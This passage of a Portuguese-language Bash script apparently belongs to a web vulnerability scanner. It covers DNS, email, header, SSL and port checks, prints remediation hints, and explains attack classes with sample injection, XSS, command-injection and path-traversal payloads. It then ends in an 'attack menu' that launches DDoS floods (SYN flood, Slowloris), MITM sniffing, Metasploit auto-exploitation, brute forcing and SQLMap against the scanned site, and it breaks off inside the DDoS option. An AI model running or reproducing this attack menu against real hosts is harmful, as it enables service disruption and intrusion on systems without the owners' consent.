echo -e "${IA_COR}${BOLD}║${RESET}    Portas/servicos: ${CYAN}${SURFACE_PORTS}${RESET} | Paths expostos: ${CYAN}${SURFACE_PATH}${RESET} | Exploitaveis: ${CYAN}${SURFACE_EXPLOIT}${RESET}"
# --- CONFIDENCE ---
echo -e "${IA_COR}${BOLD}║${RESET}"
IA_CONF="Baixa"
[ "$TOTAL_ACHADOS" -gt 5 ] && IA_CONF="Media"
[ "$TOTAL_ACHADOS" -gt 15 ] && IA_CONF="Alta"
[ "$TOTAL_ACHADOS" -gt 30 ] && IA_CONF="Muito Alta"
echo -e "${IA_COR}${BOLD}║${RESET}  ${BOLD}Confianca:${RESET} ${IA_COR}${IA_CONF}${RESET} (${TOTAL_ACHADOS} achados, ${CAT_TOTAL} pts distribuidos em ${IA_NIVEL})"
echo -e "${IA_COR}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"

# Salva no relatorio
{
  echo ""
  echo "============================================"
  echo "JOGUIN IA - SCORE HEURISTICO"
  echo "============================================"
  echo "Score de risco: $RAW_SCORE% - $IA_NIVEL"
  echo "CVSS: $CVSS_STRING (score: $CVSS_SCORE)"
  echo "Achados: $TOTAL_CRIT criticos, $TOTAL_ALERT alertas"
  echo "Perfil: $SITE_PERFIL"
  echo "Vetor principal: $MAIN_VECTOR"
  echo ""
  echo "Decomposicao de risco:"
  echo "  Execucao de Codigo: $CAT_EXEC_CODE pts"
  echo "  Vazamento de Dados: $CAT_DATA_LEAK pts"
  echo "  Controle de Acesso: $CAT_ACCESS pts"
  echo "  Configuracao: $CAT_CONFIG pts"
  echo "  Criptografia: $CAT_CRYPTO pts"
  echo ""
  echo "Cadeias de ataque:"
  for chain in "${ATTACK_CHAINS[@]}"; do echo "  [!!] $chain"; done
  echo ""
  echo "Narrativa:"
  echo "$NARRATIVA"
  echo ""
  echo "Remediation Roadmap:"
  [ -n "$FASE1" ] && echo "  Fase 1: $FASE1"
  [ -n "$FASE2" ] && echo "  Fase 2: $FASE2"
  [ -n "$FASE3" ] && echo "  Fase 3: $FASE3"
  echo "============================================"
} >> "$REPORT"

# ============================================================
# RESUMO
# ============================================================
echo ""
echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${MAGENTA}${BOLD}║              RESUMO DA VARREDURA                ║${RESET}"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

TOTAL_CRITICOS=$(grep -c "\[CRITICO\]" "$REPORT" 2>/dev/null)
TOTAL_ALERTAS=$(grep -c "\[ALERTA\]" "$REPORT" 2>/dev/null)
TOTAL=$(grep -c "\[CRITICO\]\|\[ALERTA\]" "$REPORT" 2>/dev/null)

echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}            ${CYAN}$ALVO${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Dominio:${RESET}         ${CYAN}$DOMINIO${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Relatorio:${RESET}       ${CYAN}$REPORT${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Problemas criticos:${RESET}  ${RED}$TOTAL_CRITICOS${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Alertas:${RESET}             ${YELLOW}$TOTAL_ALERTAS${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Total de achados:${RESET}    ${MAGENTA}$TOTAL${RESET}"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}NIVEL DE VULNERABILIDADE:${RESET}"
BARRA_MAX=40
if [ "$TOTAL" -ge 30 ]; then COR=$RED; NIVEL="CRITICO"
elif [ "$TOTAL" -ge 15 ]; then COR=$YELLOW; NIVEL="ALTO"
elif [ "$TOTAL" -ge 5 ]; then COR=$YELLOW; NIVEL="MEDIO"
else COR=$GREEN; NIVEL="BAIXO"
fi
N_PREENCHIDO=$((TOTAL < BARRA_MAX ? TOTAL : BARRA_MAX))
BARRA=$(printf "%${N_PREENCHIDO}s" | tr ' ' '#' 2>/dev/null)
BARRA_VAZIA=$(printf "%$((BARRA_MAX - N_PREENCHIDO))s" 2>/dev/null | tr ' ' '-')

echo -e "${MAGENTA}${BOLD}║${RESET}  ${COR}[${BARRA}${BARRA_VAZIA}]${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${COR}Nivel: ${NIVEL}${RESET}"
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Emitir relatorio...${RESET}  ${CYAN}cat $REPORT${RESET}"
echo ""

# ============================================================
# ===== PASSO 25: INFORMACOES DNS ADICIONAIS =====
progresso "Coletando informacoes DNS adicionais" 1
{
  echo ""
  echo "=== INFORMACOES DNS ==="
  echo "Dominio: $DOMINIO"
  for tipo in MX NS TXT SOA; do
    result=$(dig +short "$DOMINIO" "$tipo" 2>/dev/null | head -5)
    [ -n "$result" ] && echo "  Registros $tipo: $(echo "$result" | tr '\n' ' ')"
  done
  echo "================================"
} >> "$REPORT" 2>/dev/null || aviso "dig falhou para $DOMINIO"

# ===== PASSO 26: VERIFICACAO DE EMAIL/SPF/DMARC =====
progresso "Verificando seguranca de e-mail (SPF/DKIM/DMARC)" 1
{
  echo ""
  echo "=== SEGURANCA DE EMAIL ==="
  SPF=$(dig +short "$DOMINIO" TXT 2>/dev/null | grep -i "v=spf1" | head -1)
  [ -n "$SPF" ] && echo "  SPF: Presente" || echo "  SPF: AUSENTE (risco de spoofing)"
  DMARC=$(dig +short "_dmarc.$DOMINIO" TXT 2>/dev/null | grep -i "v=dmarc" | head -1)
  [ -n "$DMARC" ] && echo "  DMARC: Presente" || echo "  DMARC: AUSENTE"
  MX=$(dig +short "$DOMINIO" MX 2>/dev/null | head -5)
  [ -n "$MX" ] && echo "  Servidores MX:" && echo "$MX" | while read -r pref host; do echo "    $host (prioridade $pref)"; done
  echo "================================"
} >> "$REPORT" 2>/dev/null || aviso "verificacao de email falhou"

# ===== PASSO 27: HEADERS DE SEGURANCA HTTP =====
progresso "Analisando headers de seguranca HTTP" 1
{
  echo ""
  echo "=== HEADERS DE SEGURANCA ==="
  for h in "Strict-Transport-Security" "X-Frame-Options" "X-Content-Type-Options" \
           "Content-Security-Policy" "X-XSS-Protection" "Referrer-Policy" \
           "Permissions-Policy" "Access-Control-Allow-Origin"; do
    val=$(curl_rapido -sI "$ALVO" 2>/dev/null | grep -i "^$h:" | sed "s/$h: //I")
    [ -n "$val" ] && echo "  $h: $val" || echo "  $h: AUSENTE"
  done
  echo "================================"
} >> "$REPORT" 2>/dev/null || aviso "analise de headers falhou"

# ===== PASSO 28: TESTE SSL CIPHERS =====
progresso "Testando SSL/TLS ciphers" 2
if [ "$PROTOCOLO" = "https" ]; then
  {
    echo ""
    echo "=== TESTE SSL CIPHERS ==="
    WEAK_CIPHERS=$(nmap --script ssl-enum-ciphers -p 443 "$DOMINIO" 2>/dev/null | grep -i "weak\|TLSv1.0\|TLSv1.1\|RC4\|DES\|3DES\|EXPORT\|NULL\|LOW" | head -5)
    if [ -n "$WEAK_CIPHERS" ]; then
      echo "  Ciphers FRACOS detectados:"
      echo "$WEAK_CIPHERS" | while read -r line; do echo "    $line"; done
      critico "SSL ciphers fracos detectados"
    else
      echo "  Ciphers OK - nenhum fraco detectado"
    fi
    echo "================================"
  } >> "$REPORT" 2>/dev/null || aviso "teste SSL ciphers falhou"
fi

# ===== PASSO 29: ANALISE DE WAF =====
progresso "Analisando comportamento do WAF" 2
WAF_HEADERS=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -iE "cf-ray|__cfduid|cf-cache-status|x-sucuri|x-waf|server.*cloudflare|server.*akamai|server.*incapsula|x-powered-by.*waf" | head -3)
if [ -n "$WAF_HEADERS" ]; then
  aviso "WAF detectado via headers"
  {
    echo ""
    echo "=== WAF DETECTADO ==="
    echo "$WAF_HEADERS"
    echo "================================"
  } >> "$REPORT"
fi

# ===== PASSO 30: BUSCA CVE POR TECNOLOGIA =====
progresso "Buscando CVEs para tecnologias detectadas" 2
{
  echo ""
  echo "=== CVES POR TECNOLOGIA ==="
  if [ "$TEC_WP" = "1" ]; then
    WP_VER=$(curl_rapido -s "$ALVO/readme.html" 2>/dev/null | grep -oP "Version \K[0-9.]+" | head -1)
    [ -z "$WP_VER" ] && WP_VER=$(curl_rapido -s "$ALVO" 2>/dev/null | grep -oP "ver=\K[0-9.]+" | head -1)
    echo "  WordPress: ${WP_VER:-desconhecida}"
    [ -n "$WP_VER" ] && echo "    searchsploit wordpress $WP_VER"
  fi
  for tec in php apache nginx iis; do
    var="TEC_$(echo $tec | tr '[:lower:]' '[:upper:]')"
    [ "${!var}" = "1" ] && echo "  $tec detectado - searchsploit $tec para CVEs"
  done
  echo "================================"
} >> "$REPORT" 2>/dev/null || aviso "busca CVE falhou"

# ===== PASSO 31: EXPORT JSON =====
progresso "Exportando resultados em JSON" 1
JSON_FILE="${REPORT%.txt}.json"
{
  echo "{"
  echo "  \"alvo\": \"$ALVO\","
  echo "  \"dominio\": \"$DOMINIO\","
  echo "  \"data\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\","
  echo "  \"criticos\": $TOTAL_CRITICOS,"
  echo "  \"alertas\": $TOTAL_ALERTAS,"
  echo "  \"nivel\": \"$NIVEL\""
  echo "}"
} > "$JSON_FILE" 2>/dev/null && info "JSON exportado: $JSON_FILE"

# ===== PASSO 32: RELATORIO HTML =====
progresso "Gerando relatorio HTML" 1
gerar_html_report "$REPORT" "${REPORT%.txt}.html" "$ALVO" "$DOMINIO" "$(date '+%d/%m/%Y %H:%M:%S')"

# ===== PASSO 33: PORTAS ADICIONAIS (TOP 1000) =====
progresso "Escaneando portas adicionais (top 1000)" 3
{
  echo ""
  echo "=== PORTAS ADICIONAIS ==="
  NMAP_EXTRA=$(nmap -T5 -Pn --top-ports 1000 --open "$DOMINIO" 2>/dev/null | grep -E "^[0-9]+/tcp" | head -20)
  if [ -n "$NMAP_EXTRA" ]; then
    echo "$NMAP_EXTRA" | while read -r line; do
      port=$(echo "$line" | cut -d/ -f1)
      service=$(echo "$line" | awk '{print $3}')
      echo "  $port/$service aberta"
    done
  else
    echo "  Nenhuma porta adicional alem das ja escaneadas"
  fi
  echo "================================"
} >> "$REPORT" 2>/dev/null || aviso "scan de portas extra falhou"

# ===== PASSO 34: SERVICOS SMB/FTP =====
progresso "Verificando servicos SMB/FTP" 2
{
  echo ""
  echo "=== SERVICOS SMB/FTP ==="
  for p in 21 445 139 22 23; do
    timeout 3 bash -c "echo >/dev/tcp/$DOMINIO/$p" 2>/dev/null && echo "  Porta $p aberta" || true
  done
  echo "================================"
} >> "$REPORT" 2>/dev/null || true

# ===== PASSO 35: CORRELACAO FINAL =====
progresso "Correlacao final e sumarizacao" 1
{
  echo ""
  echo "=== CORRELACAO FINAL ==="
  echo "Total de criticos: $TOTAL_CRITICOS"
  echo "Total de alertas: $TOTAL_ALERTAS"
  echo "Nivel de risco: $NIVEL"
  echo "Tecnologias: ${TEC_NOME:-Nenhuma detectada}"
  echo "Ruido acumulado: $NOISE_ACUM"
  echo "================================"
} >> "$REPORT" 2>/dev/null

# ===== SEPARADOR =====
echo ""
echo -e "${MAGENTA}${BOLD}════════════════════════════════════════════════════${RESET}"
echo ""

# PASSO 25: INFORMACOES DO SITE
# ============================================================
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${GREEN}${BOLD}║           INFORMACOES DO SITE                   ║${RESET}"
echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

SERVER_HEADER=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Servidor:${RESET}       ${CYAN}${SERVER_HEADER:-Nao identificado}${RESET}"

if echo "$SERVER_HEADER" | grep -qi "cloudflare\|cloudflare-nginx"; then
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}CDN:${RESET}            ${YELLOW}Cloudflare detectado!${RESET}"
elif curl_rapido -I "$ALVO" 2>/dev/null | grep -qi "cf-ray\|__cfduid\|cf-cache-status"; then
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}CDN:${RESET}            ${YELLOW}Cloudflare detectado!${RESET}"
fi

POWERED_BY=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
[ -n "$POWERED_BY" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Powered by:${RESET}    ${CYAN}$POWERED_BY${RESET}"

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- Informacoes do Dominio --${RESET}"
WHOIS_DATA=$(whois "$DOMINIO" 2>/dev/null)
CREATION=$(echo "$WHOIS_DATA" | grep -iE "creation date|criado em|criado" | head -1 | sed 's/.*: //')
if [ -n "$CREATION" ]; then
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Criado em:${RESET}      ${CYAN}$CREATION${RESET}"
  CREATION_SEC=$(date -d "$CREATION" +%s 2>/dev/null)
  NOW_SEC=$(date +%s)
  if [ -n "$CREATION_SEC" ]; then
    DIAS=$(( (NOW_SEC - CREATION_SEC) / 86400 ))
    ANOS=$(( DIAS / 365 ))
    MESES=$(( (DIAS % 365) / 30 ))
    echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Idade:${RESET}          ${CYAN}$ANOS anos, $MESES meses ($DIAS dias)${RESET}"
  fi
fi
EXPIRY=$(echo "$WHOIS_DATA" | grep -iE "expir|vence" | head -1 | sed 's/.*: //')
[ -n "$EXPIRY" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Expira em:${RESET}      ${CYAN}$EXPIRY${RESET}"
REGISTRAR=$(echo "$WHOIS_DATA" | grep -iE "registrar|registrador" | head -1 | sed 's/.*: //')
[ -n "$REGISTRAR" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${Bold}Registrador:${RESET}   ${CYAN}$REGISTRAR${RESET}"

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- SSL/TLS --${RESET}"
if [ "$PROTOCOLO" = "https" ]; then
  SSL_INFO=$(echo | openssl s_client -connect "${DOMINIO}:443" -servername "$DOMINIO" 2>/dev/null)
  SSL_ISSUER=$(echo "$SSL_INFO" | openssl x509 -noout -issuer 2>/dev/null | sed 's/.*CN = //')
  SSL_EXPIRY=$(echo "$SSL_INFO" | openssl x509 -noout -enddate 2>/dev/null | sed 's/.*= //')
  [ -n "$SSL_ISSUER" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Emissor SSL:${RESET}    ${CYAN}$SSL_ISSUER${RESET}"
  if [ -n "$SSL_EXPIRY" ]; then
    echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Certificado:${RESET}    ${CYAN}Valido ate $SSL_EXPIRY${RESET}"
    SSL_EXP_SEC=$(date -d "$SSL_EXPIRY" +%s 2>/dev/null)
    if [ -n "$SSL_EXP_SEC" ]; then
      RESTAM=$(( (SSL_EXP_SEC - NOW_SEC) / 86400 ))
      if [ "$RESTAM" -lt 0 ]; then
        echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Status SSL:${RESET}     ${RED}VENCIDO ha $((RESTAM * -1)) dias!${RESET}"
      elif [ "$RESTAM" -lt 30 ]; then
        echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Status SSL:${RESET}     ${YELLOW}Vence em $RESTAM dias (URGENTE!)${RESET}"
      else
        echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Status SSL:${RESET}     ${GREEN}Vence em $RESTAM dias${RESET}"
      fi
    fi
  fi
else
  echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}SSL:${RESET}            ${YELLOW}Site sem HTTPS!${RESET}"
fi

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- Rede / IP --${RESET}"
IP=$(host "$DOMINIO" 2>/dev/null | awk '/has address/{print $NF; exit}') 2>/dev/null
[ -n "$IP" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}IP:${RESET}             ${CYAN}$IP${RESET}"
ASN=$(whois "$IP" 2>/dev/null | grep -iE "origin|asn|aut-num" | head -1 | sed 's/.*: *//')
[ -n "$ASN" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}ASN:${RESET}            ${CYAN}$ASN${RESET}"
PROVEDOR=$(echo "$WHOIS_DATA" | grep -iE "orgname|org name|owner-c|provedor" | head -1 | sed 's/.*: //')
[ -n "$PROVEDOR" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Provedor:${RESET}       ${CYAN}$PROVEDOR${RESET}"
PAIS=$(whois "$IP" 2>/dev/null | grep -iE "country|pais" | head -1 | sed 's/.*: *//')
[ -n "$PAIS" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Pais:${RESET}           ${CYAN}$PAIS${RESET}"

echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}-- Tecnologias Detectadas --${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${CYAN}Veja o WhatWeb acima para tecnologias completas${RESET}"
X_POWERED=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^x-powered-by:" | sed 's/.*: //')
[ -n "$X_POWERED" ] && echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}X-Powered-By:${RESET}  ${CYAN}$X_POWERED${RESET}"

echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# ============================================================
# REMENDIACAO - Comandos para corrigir cada vulnerabilidade
# ============================================================
echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${RED}${BOLD}║        REMENDIACAO - Comandos de correcao        ║${RESET}"
echo -e "${RED}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

grep -E "\[CRITICO\]|\[ALERTA\]" "$REPORT" 2>/dev/null | while IFS= read -r line; do
  fix=""
  echo "$line" | grep -qi "SQL INJECTION" && fix="Corrigir SQLi: Use prepared statements (PDO/mysqli). Ex: \$stmt = \$pdo->prepare('SELECT * FROM users WHERE id = ?'); \$stmt->execute([\$id]);"
  echo "$line" | grep -qi "Falta X-Frame-Options\|Clickjacking" && fix="Clicljacking: add_header X-Frame-Options \"SAMEORIGIN\" always;"
  echo "$line" | grep -qi "Metodo PUT habilitado\|WEBSHELL" && fix="PUT ativo: Bloqueie metodos PUT/DELETE/PATCH no servidor."
  echo "$line" | grep -qi "DEFAULT CREDENTIALS" && fix="Credenciais padrao: Altere imediatamente as senhas de todos os usuarios padrao."
  echo "$line" | grep -qi "REPOSITORIO GIT EXPOSTO" && fix="Git exposto: location ~ /\.git { deny all; }"
  echo "$line" | grep -qi "ARQUIVO .ENV EXPOSTO" && fix=".env exposto: location ~ /\\.env { deny all; }"
  echo "$line" | grep -qi "CONFIG EXPOSTO\|BACKUP WP-CONFIG\|BACKUP BD" && fix="Config/backup exposto: Bloqueie servindo arquivos .bak,.old,.sql,.dump,.swp,.save"
  echo "$line" | grep -qi "Falta HSTS" && fix="HSTS: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;"
  echo "$line" | grep -qi "Falta CSP" && fix="CSP: add_header Content-Security-Policy \"default-src 'self'\" always;"
  echo "$line" | grep -qi "Falta X-Content-Type-Options" && fix="X-Content-Type-Options: add_header X-Content-Type-Options \"nosniff\" always;"
  echo "$line" | grep -qi "Falta X-XSS-Protection" && fix="XSS-Protection: add_header X-XSS-Protection \"1; mode=block\" always;"
  echo "$line" | grep -qi "ACESSO LIVRE" && fix="Painel exposto: Restrinja por IP (allow X.X.X.X; deny all;)"
  echo "$line" | grep -qi "WAF detectado" && fix="WAF detectado: Revise as regras do WAF. Possivel falso positivo."
  if [ -n "$fix" ]; then
    achado=$(echo "$line" | sed 's/\[CRITICO\] //;s/\[ALERTA\] //')
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
    echo -e "${RED}${BOLD}║${RESET}"
    echo -e "${RED}${BOLD}║${RESET}  ${BOLD}Achado:${RESET} ${YELLOW}$achado${RESET}"
    echo -e "${RED}${BOLD}║${RESET}  ${BOLD}FIX:${RESET}   ${GREEN}$fix${RESET}"
    echo -e "${RED}${BOLD}║${RESET}  ${BOLD}CMD:${RESET}   ${CYAN}$(echo "$fix" | grep -oP 'sudo[^.\n]*|a2dismod[^.\n]*|rm[^.\n]*|systemctl[^.\n]*|htpasswd[^.\n]*|add_header[^.\n]*|location[^.\n]*' | head -1)${RESET}"
    echo "" >> "$REPORT"
    echo "[FIX] $achado" >> "$REPORT"
    echo "  Comando: $(echo "$fix" | grep -oP 'sudo[^.\n]*|a2dismod[^.\n]*|rm[^.\n]*|systemctl[^.\n]*|htpasswd[^.\n]*|add_header[^.\n]*|location[^.\n]*' | head -1)" >> "$REPORT"
  fi
done

echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# ============================================================
# EXPLICACAO DAS VULNERABILIDADES
# ============================================================
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║        EXPLICACAO DAS VULNERABILIDADES          ║${RESET}"
echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"

echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}SQL Injection:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Injetar comandos SQL nos campos de entrada"
echo -e "${CYAN}${BOLD}║${RESET}  para manipular o banco de dados."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: ' OR 1=1 -- - no campo de login"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}XSS (Cross-Site Scripting):${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Injetar scripts maliciosos no site"
echo -e "${CYAN}${BOLD}║${RESET}  para roubar cookies ou redirecionar."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: <script>alert('XSS')</script>"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Command Injection:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Executar comandos no servidor atraves"
echo -e "${CYAN}${BOLD}║${RESET}  de inputs maliciosos."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: ; ls -la ou | whoami"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}LFI/RFI (File Inclusion):${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Incluir arquivos locais ou remotos"
echo -e "${CYAN}${BOLD}║${RESET}  para vazar dados sensiveis."
echo -e "${CYAN}${BOLD}║${RESET}  Ex: ../../../etc/passwd"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}CSRF (Cross-Site Request Forgery):${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Forcar usuario a executar acoes"
echo -e "${CYAN}${BOLD}║${RESET}  sem seu consentimento."
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Clickjacking:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Site pode ser colocado dentro de um iframe"
echo -e "${CYAN}${BOLD}║${RESET}  e cliques podem ser sequestrados."
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Metodo PUT habilitado:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Atacante pode fazer upload de arquivos"
echo -e "${CYAN}${BOLD}║${RESET}  maliciosos (webshell) no servidor."
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Diretorios expostos:${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Pastas como /admin, /backup, /.git"
echo -e "${CYAN}${BOLD}║${RESET}  acessiveis publicamente vazam informacoes."
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

{
  echo ""
  echo "============================================"
  echo "RESUMO: $TOTAL_CRITICOS criticos, $TOTAL_ALERTAS alertas"
  echo "NIVEL: $NIVEL"
  echo "============================================"
} >> "$REPORT"

# === LIMPEZA ===
limpar_temporarios

# ============================================================
# CONCLUSAO
# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${GREEN}${BOLD}║           VARREDURA CONCLUIDA!                  ║${RESET}"
echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}          ${CYAN}$ALVO${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Passos:${RESET}        ${CYAN}$PASSO_ATUAL de $TOTAL_PASSOS${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Criticos:${RESET}      ${RED}$TOTAL_CRITICOS${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Alertas:${RESET}       ${YELLOW}$TOTAL_ALERTAS${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Nivel:${RESET}         ${COR}$NIVEL${RESET}"
np_final=$((NOISE_ACUM*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
cn_final=$([ "$np_final" -le 30 ]&&echo "$GREEN"||[ "$np_final" -le 60 ]&&echo "$YELLOW"||echo "$RED")
nf=$((np_final/2)); ne=$((50-nf))
bf=$(printf "%${nf}s"|tr ' ' '#'); be=$(printf "%${ne}s")
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Ruido:${RESET}         ${cn_final}[${bf}${be}] ${np_final}%${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}Relatorio:${RESET}     ${CYAN}$REPORT${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}JSON:${RESET}          ${CYAN}${REPORT%.txt}.json${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}HTML:${RESET}          ${CYAN}${REPORT%.txt}.html${RESET}"
echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# ===== ATAQUE POS-SCAN =====
echo ""
echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${RED}${BOLD}║                    MENU DE ATAQUE - Invasao                  ║${RESET}"
echo -e "${RED}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${RED}${BOLD}║${RESET}"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[1]  DDoS${RESET}      - DDoS-Ripper (Negacao de Servico)"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[2]  hping3${RESET}    - DDoS via SYN Flood"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[3]  SlowHTTP${RESET}  - Slowloris (consume conexoes)"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[4]  Bettercap${RESET}  - MITM / Sniffing"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[5]  Metasploit${RESET} - Auto-exploit + suggester"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[6]  Medusa${RESET}     - Brute force multifluxo"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[7]  Ncrack${RESET}     - Brute force RDP/SSH"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[8]  Ettercap${RESET}   - MITM / Sniffing avancado"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[9]  SQLMap${RESET}     - SQL injection direto"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[10] Nmap${RESET}      - Portas / servicos personalizado"
echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[0]  Sair${RESET}"
echo -e "${RED}${BOLD}║${RESET}"
echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
printf "${YELLOW}Escolha o ataque (0-10): ${RESET}"; read -r ATAQUE_OPT

ALVO_IP=$(dig +short "$DOMINIO" 2>/dev/null | head -1)
[ -z "$ALVO_IP" ] && ALVO_IP=$(echo "$IP_ALVO" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')

case $ATAQUE_OPT in
  1) # DDoS-Ripper
    if [ -n "$ALVO_IP" ]; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║           DDoS - Negacao de Servico             ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${YELLOW}Alvo: $ALVO_IP${RESET}"
      echo -e "${RED}║${RESET}  ${YELLOW}Porta: 80${RESET}"
      echo -e "${RED}║${RESET}"
      printf "${RED}Confirmar? (s/N): ${RESET}"; read -r CONFIRMA
      if [ "$CONFIRMA" = "s" ] || [ "$CONFIRMA" = "S" ]; then
        echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
